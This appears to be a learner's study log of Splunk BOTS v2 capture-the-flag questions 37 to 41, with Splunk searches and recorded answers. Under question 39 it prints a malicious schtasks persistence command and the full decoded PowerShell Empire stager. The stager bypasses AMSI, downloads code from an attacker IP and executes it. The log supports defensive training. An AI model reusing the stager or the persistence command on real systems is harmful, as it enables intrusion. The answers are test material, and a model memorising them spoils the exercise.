@@ -1,0 +1,196 @@
+Today I spent my time working on Splunk BOTS v2 some more and also signed up for :
+SOC Core Skills w/ John Strand starting Feb 2nd 
+and
+SANS New to Cyber Summit 2021
+
+BOTSv2 work today:
+
+37. What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith	
+
+From Virustotal for the invoice.doc:
+
+CDF V2 Document, Little Endian, Os: MacOS, Version 10.3, Code page: 10000, Author: Ryan Kovar, Template: Normal.dotm, Last Saved By: Ryan Kovar, Revision Number: 3, Name of Creating Application: Microsoft Macintosh Word, Total Editing Time: 01:00, Create Time/Date: Sat Jul 08 22:07:00 2017, Last Saved Time/Date: Tue Aug 01 05:26:00 2017, Number of Pages: 1, Number of Words: 21, Number of Characters: 125, Security: 0
+
+---------------
+A: Ryan Kovar
+===============================================================================================================================	
+38. What is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9	
+
+splunk write-up on Shannon entropy score:
+"allows us to determine the amount of randomness present in a string. For example, google.com has an entropy score of 2.65, but c32DyQG9dyYtuB471Db.com has an entropy score of 4.2! Using this technique provides us the ability to hunt for algorithmically-generated domain names."
+
+https://www.splunk.com/en_us/blog/tips-and-tricks/you-can-t-hyde-from-dr-levenshtein-when-you-use-url-toolbox.html
+
+Now that I have an understanding of Shannon entropy score. I have to figure out what domain is exfiltrating data and how.
+
+first I want to see the IPs getting DNS queries and how many, So I will create a stats count. 
+
+	sourcetype=stream:dns dest_port=53 
+	| stats count by dest_ip 
+	| sort -count
+
+Some I used dnslytics.com to search
+Top 6 (rest are 14 or below, not to concerning when I see the high ends)
+8.8.8.8	         81603  (google) 
+10.0.1.100	 44676  (internal)
+172.31.0.2	 34004  (internal)
+4.4.4.4	         7479   (level 3)
+208.109.255.42	 444    (domain through godaddy)
+216.69.185.42	 406    (domain through Host Europe GmbH)
+192.52.178.30	 30     (VeriSign Global Registry Services)
+192.175.48.42	 26     (DNS-OARC)
+
+I will look more into 208.109.255.42 and 216.69.185.42.
+
+
+	sourcetype=stream:dns dest_port 53 (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42)
+	| table dest_ip query
+	| where query!=""
+
+They all come up with "hildegardsfarm.com"
+I need some regex to get the subdomain.
+
+	sourcetype=stream:dns dest_port 53 (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42)
+	| rex field=query "(?P<sub>.+).h.+"
+	| table sub
+	| where sub!=""
+
+In my previous research for Shannon entropy score.  I came accross the ut_shannon command to get the Shannon entropy score. 
+|'ut_shannon(sub)'|table ut_shannon sub
+
+	sourcetype=stream:dns (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42)
+	| rex field=query "(?P<sub>.+).h.+"
+	| `ut_shannon(sub)`
+	| table sub ut_shannon
+	| where sub!=""
+
+Now I need the average for sub.
+
+	sourcetype=stream:dns (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42)
+	| rex field=query "(?P<sub>.+).h.+"
+	| `ut_shannon(sub)`
+	| stats avg(ut_shannon)
+
+3.6249634545265272
+
+---------------
+A:3.6
+===============================================================================================================================	
+39. To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html	
+
+microsoft docs says "The schtasks.exe tool performs the same operations as Scheduled Tasks in Control Panel. You can use these tools together and interchangeably."
+I want to see how often commands with "schtasks.exe" are ran
+
+	CommandLine=*schtasks.exe* 
+	| stats count by CommandLine
+
+Still counting but this one looks susspicious
+
+"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""
+
+There are a few with different start times and 1 count each.
+
+I want to view them so I will take a matching part and search in sysmon
+
+	CommandLine=*FromBase64String* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+
+5 events - 2 that run powershell.exe and 3 that run schtasks.exe .
+
+I took one of the schtasks.exe ones and decoded the base64 (base64decode.org) and got:
+
+[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed','NonPublic,Static').SEtVaLuE($NULl,$trUE)};[SYstEM.Net.SERviCePoINtMAnAGer]::EXpEct100ContInuE=0;$Wc=NeW-Object SyStEM.NeT.WeBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaDers.Add('User-Agent',$u);$WC.ProxY=[SYstEm.Net.WEBREQUest]::DeFaulTWEBPROxY;$Wc.ProxY.CReDenTiaLs = [SysTem.NeT.CredEntIAlCache]::DefAultNeTWorkCrEDeNTIAls;$K=[SysTem.TexT.EncODING]::ASCII.GetBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};$wc.HEADeRs.AdD("Cookie","session=MvCdddPqFQ54VL4OWU5ryRTUir8=");$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER+$t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV+$K))|IEX
+
+make it easier to read:
+
+[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed','NonPublic,Static').SEtVaLuE($NULl,$trUE)};[SYstEM.Net.SERviCePoINtMAnAGer]::EXpEct100ContInuE=0;
+$Wc=NeW-Object SyStEM.NeT.WeBCLIent;
+$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+$WC.HEaDers.Add('User-Agent',$u);
+$WC.ProxY=[SYstEm.Net.WEBREQUest]::DeFaulTWEBPROxY;
+$Wc.ProxY.CReDenTiaLs = [SysTem.NeT.CredEntIAlCache]::DefAultNeTWorkCrEDeNTIAls;
+$K=[SysTem.TexT.EncODING]::ASCII.GetBytes('389288edd78e8ea2f54946d3209b16b8');
+$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;
+$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};
+$wc.HEADeRs.AdD("Cookie","session=MvCdddPqFQ54VL4OWU5ryRTUir8=");
+$ser='https://45.77.65.211:443';
+$t='/admin/get.php';
+$dAtA=$WC.DOwnlOaDDatA($SER+$t);
+$Iv=$DATA[0..3];
+$dATA=$DaTA[4..$DatA.LeNgTh];
+-join[ChAR[]](& $R $DATA ($IV+$K))|IEX
+
+In the CommandLine is "FromBase64String((gp HKLM:\Software\Microsoft\Network debug)"
+
+I am going to check in this file in WinRegistry
+
+source=WinRegistry object_path="HKLM\\software\\microsoft\\network"
+
+4 events
+
+I could create a regex script and save all them to run against but I would tkae long than just decoding the 4 on https://www.base64decode.org/  and looking for the destinations.
+So I will do that since it's only 4.
+
+1. /news.php
+2. /login/process.php
+3. /login/process.php
+4. /admin/get.php
+
+---------------
+A: process.php
+===============================================================================================================================	
+40. The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4	
+
+The server that these files are going to is 45.77.65.211
+Nothing helpful in Virustotal.
+ 
+Earlier today I watched a video (https://www.activecountermeasures.com/cyber-threat-hunting-training-course/) and part of it explained beacons as acting as a proxy between the target and atacker. 
+So I researched it a bit and found CI Security has a write-up on beacons.
+
+"Beaconing is when the malware communicates with a C2 server asking for instructions or to exfiltrate collected data on some predetermined asynchronous interval. The C2 server hosts instructions for the malware, which are then executed on the infected machine after the malware checks in. How frequently the malware checks in, and what methods it uses for this communication are typically configured by the attacker."
+
+Also found "By searching for the domain name within the certificates in tools like Shodan.io or Censys.io, it is not uncommon to find multiple servers that use the same certificate" (https://osintcurio.us/2019/03/12/certificates-the-osint-gift-that-keeps-on-giving/)
+
+of course I wont find info on that in the logs since its outside the network
+
+since it may have many machines doing this work, I wonder if it would have the same certificate.  I found a website to search SSL certificates and hosts that use them.
+
+TCP finds certificate info, so I will check that and the IP for any info to help my search
+
+	sourcetype="stream:tcp" "45.77.65.211"
+
+
+29069 events, thats worrysome.
+
+However, good news is I have 1 MD5: 671DFE1D4F15C5A05F21DDB66D3B7815
+ 
+censys.io reports the ticket is expired. (Validity 2017-07-06 18:16:15 to 2018-07-06 18:16:15) as well as 
+Your query (671DFE1D4F15C5A05F21DDB66D3B7815) found 0 IPv4 hosts.
+
+"Warning: Censys only allows 10 search queries per day without registration to prevent abuse. Please create an account or login below."
+I dont think I did 10 but OK.  
+
+One last thing I tried was threatcrowd and AlienVault,  nothing about additional IPs on the IP or the Hash
+
+Guess done with this question.
+
+---------------
+A:
+????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+===============================================================================================================================	
+41. The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.	
+
+Since this was a TCP-exflitration,  I will look at FTP instead of DNS since the DNS exfiltration normally is UDP.
+
+sourcetype="stream:ftp"
+
+1490 events.
+
+
+
+
+
+---------------
+A: Still Working on
